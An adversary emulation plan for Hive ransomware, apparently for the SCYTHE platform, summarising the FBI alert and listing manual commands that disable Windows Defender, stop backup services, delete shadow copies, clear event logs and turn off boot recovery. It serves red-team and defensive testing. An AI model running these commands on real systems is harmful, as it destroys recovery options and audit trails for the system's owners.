# Hive Ransomware Adversary Emulation Plan

This threat is based on the FBI Flash Alert on August 25,2021: https://www.ic3.gov/Media/News/2021/210825.pdf

## Summary from Cyber Threat Intelligence
Hive ransomware, which was first observed in June 2021 and likely operates as an affiliate-based ransomware, employs a wide variety of tactics, techniques, and procedures (TTPs), creating significant challenges for defense and mitigation. Hive ransomware uses multiple mechanisms to compromise business networks, including phishing emails with malicious attachments to gain access and Remote Desktop Protocol (RDP) to move laterally once on the network.

After compromising a victim network, Hive ransomware actors exfiltrate data and encrypt files on the network. The actors leave a ransom note in each affected directory within a victim’s system, which provides instructions on how to purchase the decryption software. The ransom note also threatens to leak exfiltrated victim data on the Tor site, “HiveLeaks.”

## Emulate with SCYTHE
**Please note that this threat, if executed with administrative privileges, will disable services, delete Volume Shadow Copies, delete Windows Event Logs, and modify bootup procedures. For testing purposes, you may want to test in non-production, make an offline backup, and/or or take a snapshot.

1. Download and import the threat in JSON format to your SCYTHE instance 
2. Download the Virtual File System (VFS) files under the VFS folder
3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/Hive
4. Create a new campaign, selecting HTTPS, and configure your HTTPS communication options.
5. Import from Existing Threat: Hive
6. Launch Campaign
7. Download the EXE and rename it to Winlo_dump_64_SCY.exe

## Emulate Manually
Open an elevated command line interface and run:
- powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
- sc stop LanmanWorkstation
- sc stop SamSs
- sc stop SDRSVC
- sc stop SstpSVc
- sc stop UI0Detect
- sc stop Vmicvss
- sc stop Vmss
- sc stop VSS
- sc stop Wbengine
- sc stop Unistoresvc
- wmic.exe SHADOWCOPY /nointeractive
- wmic.exe shadowcopy delete
- wevtutil.exe cl system
- wevtutil.exe cl security
- wevtutil.exe cl application
- bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
- bcdedit.exe /set {default} recoveryenabled norun
